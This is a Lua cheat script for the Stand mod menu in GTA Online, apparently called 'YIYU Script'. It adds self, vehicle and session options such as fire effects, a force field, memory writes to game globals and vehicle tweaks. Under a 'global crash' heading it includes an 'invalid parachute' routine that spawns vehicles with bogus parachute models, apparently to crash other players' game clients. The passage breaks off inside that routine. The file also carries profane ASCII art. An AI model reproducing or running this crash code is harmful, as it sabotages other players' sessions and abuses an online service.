util.require_natives(1640181023)
util.require_natives(1660775568)
util.show_corner_help("<font size='16'>~o~欢迎使用~w~^-^~b~YIYU Script" .."\n ~r~‹ ~y~ ‹ ~g~ ‹ ~g~\n" )
JSkey = require 'lib.JSkeyLib'
 require"lib.yiyulib.yiyulib"
 local logo = directx.create_texture(filesystem.scripts_dir() .. '/YIYU/' .. '1989.png')
 local logo1 = directx.create_texture(filesystem.scripts_dir() .. '/YIYU/' .. '19892.png')

 


--     __ ∧_∧＿_
--   ／ (´･ω･`) ／＼
--／|￣ ∪∪￣￣￣￣￣|＼／



-- $#0JLLLLLQOW$                       $#0LLLLLLJOM$ $a0LLLLL0a$ $8mJLLLLLQQo$                       $8OLLLLLLCQ*$ $#0CCJJJCd$                     $Jfuckyoulance   
-- $#u!`^"""",{p$$                    $O]"""""^^<Y*do$Cl^"""";C%k88U~^^"""""-Q@$                    $d):^"""^^lnaab$w>^"""^"nBa#$                  $Ll^"""^"v%h&$
--  $@L_       !zo@$                $#n;      .?n)+)w$J"     'cn}q$$w{`      :rb%$                $BU>       <r\_[J@m:      fz]Y$                  $J"      rc}m$
--    $oj:      '1w8$              $w}'      I//i;1Q8$J"     'v|<m$ $&ci      ._QM$              $k\"      "(j+;]UM$mI     .tj!u$                  $J,     .rtiZ$
--      $0-.      iY*$           $8zl      ']x];~v#$ $C"     'c\~m$   $p)^      :nh@$          $$L+      .+x)I>fk$ $mI     .fr!u$                  $C,     .rf>Z$
--       $*x;      ^\dB$        $b)`      lf/!I)Z$   $J"     'c\~m$    $8X>      '[Z&$        $oj,      ,(j~;]J$   $mI     .fr!u$                  $C,     .xf<Z$
--         $O?.      ~C#$     $BY>      '[x];+vM$    $C"     'c\~Z$      $p)^      lco$      $Z?.     .+x)I>jb$    $mI     .fj!u$                  $C,     .xf<Z$
--          $*x;      ,jkB$  $h\"      lf/!l(Z$      $C,     'c\~Z$       $8Y>      `)q8$  $MnI      ,|j~;[C$      $mI     .fj!u$                  $C,     .xf<Z$
--            $Z]'     .-0W$$L+      '[x];+cM$       $C,     'c\~m$         $d(^      iY#$$w}'     .+x1;>jk$       $mI     .fj!u$                  $C,     .xf<Z$
--             $#nI      :ndr,      lf/!l(m$         $C,     'c\~m$          $%Y>      ^\pXl      :\j<;}C$         $mI     .fr!u$                  $C,     .xf<Z$
--               $Z]'     ';.     `}x?;_cW$          $C,     'c\~m$            $b("      :`     .+x{;>rh$          $mI     .fr!u$                  $C,     .rf<Z$
--                $MnI           lf/!l|m$            $C,     'c\~m$             $%Y<           :|j<;}Q$            $mI     .tr!u$                  $J,     .rf<Z$
--                  $Z]'       `[x?;_cW$             $C,     'c\~m$               $b|"       .+x1;<ra$             $m;     .tr!u$                  $J,     .rf>Z$
--                   $W/'     'fr!l(m$               $C,     'c\~m$                $Bz"      {v~;}C$               $m;     .tr!v$                  $C,     .jf>Z$
--                    $z` ..  ^z1ic&$                $C, ..  `c\~m$                 $m; ... .jjIfa$                $ql     ./n!u$                  $J"     .nt>Z$
--                    $z^.....^c1-h$                 $C:.....`c\~m$                 $Z;......jjiQ$                 $a?......-z+n$                  @r'.....,X{<Z$
--                    $z"'''''"z{_b$                 $C:'''''^c\~m$                 $ZI''''''jjiL$                 $$z^.'''.^tru8                 $Ql.''''.}z!-w$
--                    $X,`^^^`:z{_b$                 $LI`^^^`,z\~Z$                 $m!`^^^`^rjiL$                  $#)``````,)Y#$             $$hu!`````'>z];f&$
--                    $Y;""""";X{_b$                 $Ql""""":z\~Z$                 $mi""""""xjiL$                   $k\;^^^"^^l)cLqa8B$$$@8#p0c|~"^^^^^^_x[;-Z$ 
--                    $YI,:::,lX{_b$                 $Qi,:::,IX\~m$                 $m>,:::::xjiL$                    $8U[;"",,""";i+?][[]]?_<l,"",,,":~/j+;[Q$  
--                    $YI:::::lY1_b$                 $Q!:::::IX\~m$                 $m>::::::njiL$                      $MQf_I:::::::::::::::::::::l~{/\-I+jd$   
--                    $O{[}???}Y[+b$                 $q)[}???[U)<m$                 $d([}]??]z/!C$                        $$oZXf}_<>i!llll!!i<~_]1|\)->>]xq$     
--                    $@8Bknffj\?(a$                 $@B@auffj/]1p$                 $@8BMzfjjt[[O$                           $$8kOJXnjt//\|((|(1{}]]}|nQ&$       
--                    #@$%%bqqqpk*%$                 @&^#%bqqqpko8$                 #$%^$hqqqqka&$                               $$amZLzvcccvunvY0m*$$           



local yourself
local yourselfCoord = {x=0,y=0,z=0}
local visualHelp = false
local visualHelpEnt
local entityToSpawn = util.joaat("prop_mk_sphere")
local blackHole = false
local blackHoleType = "black"
local blackHoleVehicle
local blackHolePos = {x = 0, y = 0, z = 0}
local vehiclePos = {x = 0, y = 0, z = 0}
local tableBlackHole = {"拉", "推",}
local pushStrength = 1
local pushToX = 1
local pushToY = 1
local pushToZ = 1
local YIYU = "YIYU Script"
local ver= "版本号3.2 更新于2023.05.05"
local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then 
            util.stop_thread() 
        end
        callback()
    end)
end


util.log("███    ███    ███    ███      ███   ███    ███")
util.log(" ███  ███     ███      ███  ███     ███    ███")
util.log("   ███        ███        ███        ███    ███")
util.log("   ███        ███        ███        ███    ███")
util.log("   ███        ███        ███        ███    ███")
util.log("   ███        ███        ███        ██████████")


local duanxin = {
    "<font size='20'>~r~   HI ^^",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}
local player_vehicle 
local mst_warn
local lastwpn
local mode 
local wpn
local altitude = 0
local missile_nearby 
colors = {

    green = 184,

    red = 6,

    yellow = 190,

    black = 2,

    white = 1,

    gray = 3,

    pink = 201,

    purple = 49, 

    blue = 11

    }

    function notification(message, color)

        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)

    

        local picture = "CHAR_LESTER_DEATHWISH"

        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)

        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do

            util.yield()

        end

        util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)

    

        title = " ‹YIYU Script ‹"

        if color == colors.red or color == colors.red then

            subtitle = "~u~信息"

        elseif color == colors.black then

            subtitle = "~c~信息"

        else

            subtitle = "~u~信息"

        end

        HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

    

        HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)

        util.log(message)

    end
    notification(" <font size='15'>~r~~italic~欢迎使用~w~YIYU Script  ", colors.black)


 util.keep_running()
 menu.action(menu.my_root(),"重启脚本",{},"",function ()
    util.restart_script()
end)
    menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. duanxin[math.random(1, #duanxin)])
    util.yield()
    menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))

 scaleform_thread = util.create_thread(function (thr)

	scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("mp_big_message_freemode")

	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(" ~bold~&#8721;YIYU Lua Script&#8721;")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("~b~‹~g~ ‹~y~ ‹ ~r~‹ ~p~‹\n\n~r~&#8721;=====欢迎使用=====&#8721;\n\n~s~ Version 3.2 ~b~文件群：772361223\n\n~b~‹~g~ ‹~y~ ‹ ~r~‹ ~p~‹")

	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusIn", "HintCamSounds", true)

	starttime = os.time()

	while true do

	if os.time() - starttime >= 8 then

	    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusOut", "HintCamSounds", true)

	    util.stop_thread()

    end

	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 155, 155, 255, 255,0)


    end

	   util.yield(1)

        end

    end)
 MISC.FORCE_LIGHTNING_FLASH()



 local yiyumain = menu.attach_before(menu.ref_by_path('Stand>Settings'),menu.list(menu.shadow_root(), 'YIYU Script', {"yiyuluascript"}, '', 
 function()end))


 local homedongtai = menu.divider(yiyumain, "主页动态", {}, "")
 local loading_frames = {'=====','+++++',}
 util.create_tick_handler(function()
     for _, frame in pairs(loading_frames) do
         menu.set_menu_name(homedongtai, frame .. ' ' .. YIYU .. ' ' .. frame)
         util.yield(100)
     end
 end)



self= menu.list(yiyumain, "                           自我选项", {}, "", function(); end)

local new = {}

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end

function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end

function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end


anim_request = function(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        util.yield()
    end
end


local fireWings = {
    [1] = {pos = {[1] = 120, [2] =  75}},
    [2] = {pos = {[1] = 120, [2] = -75}},
    [3] = {pos = {[1] = 135, [2] =  75}},
    [4] = {pos = {[1] = 135, [2] = -75}},
    [5] = {pos = {[1] = 180, [2] =  75}},
    [6] = {pos = {[1] = 180, [2] = -75}},
    [7] = {pos = {[1] = 195, [2] =  75}},
    [8] = {pos = {[1] = 195, [2] = -75}},
}
local mildOrangeFire = new.colour( 255, 127, 80 )

local fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}

    local function loadModel(hash)
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end
    local remove_projectiles = false
    local function disableProjectileLoop(projectile)
        util.create_thread(function()
            util.create_tick_handler(function()
                WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
                return remove_projectiles
            end)
        end)
    end
 
local hcb = menu.list(self, '火翅膀选项', {}, '')

        local ptfxEgg
        menu.toggle(hcb, '火翅膀', {'JSfireWings'}, '', function (toggle)
            fireWingsSettings.on = toggle
            if fireWingsSettings.on then
                ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
                if ptfxEgg == nil then
                    local eggHash = 1803116220
                    loadModel(eggHash)
                    ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                    ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
                end
                for i = 1, #fireWings do
                    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                        util.yield()
                    end
                    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                    fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

                    util.create_tick_handler(function()
                        local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                        ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                        for i = 1, #fireWings do
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                        end

                        ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                        return fireWingsSettings.on
                    end)
                end
            else
                for i = 1, #fireWings do
                    if fireWings[i].ptfx then
                        GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                        fireWings[i].ptfx = nil
                    end
                    if ptfxEgg then
                        entities.delete_by_handle(ptfxEgg)
                        ptfxEgg = nil
                    end
                end
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
        end)

        menu.slider(hcb, '火翅膀大小', {'JSfireWingsScale'}, '', 1, 100, 3, 1, function(value)
            fireWingsSettings.scale = value / 10
        end)

        menu.rainbow(menu.colour(hcb, '火翅膀颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            fireWingsSettings.colour = colour
        end))

        local levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)
        local firebreath = menu.list(self, '喷火选项', {}, '')
    
        local fireBreathSettings = {
            scale = 0.3,
            colour = mildOrangeFire,
            on = false,
            y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
            z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
        }
    
        local function transitionValue(value, target, step)
            if value == target then return value end
            return value + step * ( value > target and -1 or 1 )
        end
    
        function fireBreathSettings:changePos(movementType)
            self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
            self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
        end
    
        menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
            fireBreathSettings.on = toggle
            if toggle then
                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                    util.yield()
                end
                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
            else
                GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
                fireBreathSettings.ptfx = nil
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
            util.create_tick_handler(function()
                local user_ped = players.user_ped()
                if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
                elseif menu.get_value(levitationCommand) then
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
                else
                    local movementType = 'still'
                    if TASK.IS_PED_SPRINTING(user_ped) then
                        movementType = 'sprint'
                    elseif TASK.IS_PED_WALKING(user_ped) then
                        movementType = 'walk'
                    elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                        movementType = 'sneak'
                    end
    
                    fireBreathSettings:changePos(movementType)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
                end
                return fireBreathSettings.on
            end)
        end)
    
        menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
            fireBreathSettings.scale = value / 10
            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
        end)
    
        menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
            fireBreathSettings.colour = colour
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
        end))
        action_lua = menu.list(self, "动作选项", {}, "", function(); end)
            require "lib.yiyulib.Actions"

        menu.toggle_loop(self,"汤米模式", {}, "易溶于水", function()
            if ENTITY.IS_ENTITY_IN_WATER(players.user_ped()) and not PED.IS_PED_DEAD_OR_DYING(players.user_ped()) then
                menu.trigger_commands("ewo")
            end
        end)
--
local bigbarrelqq = false
        menu.toggle(self, "大锤", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(self, "力场", {""}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)


menu.toggle(self, "空中游泳",{""}, "",function(on)
    if on then
        menu.trigger_commands("swiminair on")
    else
        menu.trigger_commands("swiminair off")
    end
end)
        menu.slider(self, "人物透明度", {""}, "", 0, 100, 100, 20, function(value)
            if value > 80 then
                ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
            else
                ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
            end
            end)
 menu.toggle_loop(self, "快速复活", {}, "", function()
    local player = players.user_ped()
    local pointr = entities.handle_to_pointer(player)
    if entities.get_health(pointr) < 100 then
    GRAPHICS.ANIMPOSTFX_STOP_ALL()
    memory.write_int(memory.script_global(2672505 + 1684 + 756), memory.read_int(memory.script_global(2672505 + 1684 + 756)) | 1 << 1) 
    end
 end)


zaiju= menu.list(yiyumain, "                           载具选项", {}, "", function(); end)
menu.slider(zaiju, "修改速度限制", {"speedlimit"}, "默认值为540", 1, 10000, 6, 1, function(on_change) 
    speedlimit = on_change
end)
menu.toggle_loop(zaiju, "路怒症模式", {}, "", function()
    if player_cur_car ~= 1 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(1, 50), false)
        PAD._SET_CONTROL_NORMAL(1, 86, 1.0)
        util.yield()
        PAD._SET_CONTROL_NORMAL(1, 86, 0.0)
    end
end)
menu.toggle_loop(zaiju, "载具转向灯（按ADS键使用）", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)
local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
menu.toggle_loop(zaiju, "随机增强（循环）", {}, "", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("未检测到载具") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)
menu.toggle(zaiju, "特斯拉自动驾驶", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
	    	local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)
local seat_id = -1
local moved_seat = menu.click_slider(zaiju, "更换座位", {}, "选择数值后回车更换座位", 1, 1, 1, 1, function(seat_id)
    TASK.TASK_WARP_PED_INTO_VEHICLE(players.user_ped(), entities.get_user_vehicle_as_handle(), seat_id - 2)
end)

menu.on_tick_in_viewport(moved_seat, function()
    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end

    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end
    
    moved_seat.max_value = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(entities.get_user_vehicle_as_handle()))
end)
policecar=menu.list(zaiju, "警车选项", {}, "", function(); end)
require "lib.yiyulib.policecar"



all = menu.list(yiyumain, "                           战局选项", {}, "", function(); end)


menu.divider(all, "====全局崩溃====")


menu.action(all, "无效降落伞Plus", {}, "", function ()
            notification("开始崩溃", colors.black)
            local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
            local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            --^^
            local user = players.user()
            local user_ped = players.user_ped()
            local pos = players.get_position(user)
            ---^^
            local spped = PLAYER.PLAYER_PED_ID()
            local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
            for i = 1, 5 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
                util.yield(100)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	3235319999)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(100)
                entities.delete_by_handle(Ruiner2)
            end
 
            for i = 1, 10 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2000, false, true, true)
                util.yield(120)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(120)
                entities.delete_by_handle(Ruiner2)
            end
     
            for i = 1, 10 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
                PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
                util.yield(100)
                VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	546252211)
                VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
                util.yield(100)
                entities.delete_by_handle(Ruiner2)
            end
    

            for i = 1, 8 do
                local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
                local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
